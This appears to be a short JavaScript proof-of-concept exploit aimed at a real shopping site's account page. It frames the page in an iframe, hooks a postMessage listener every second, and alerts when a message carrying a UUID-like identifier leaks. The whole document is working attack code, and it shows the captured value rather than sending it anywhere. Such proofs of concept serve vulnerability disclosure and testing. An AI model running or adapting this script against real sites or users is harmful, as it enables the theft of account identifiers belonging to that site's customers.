var a=document.createElement("iframe");
a.src="https://www.zooplus.com/account/overview";
a.name="mainsite";
document.body.appendChild(a);
function messageHandler(e){
  console.log(e);
  if(e.data.includes("-")){
    alert("The UUID has leaked in the following postMessage" + e.data);
  }
}

function hookMessageHandler(){
  mainsite.window.addEventListener("message",messageHandler)
}
setInterval(hookMessageHandler, 1000);
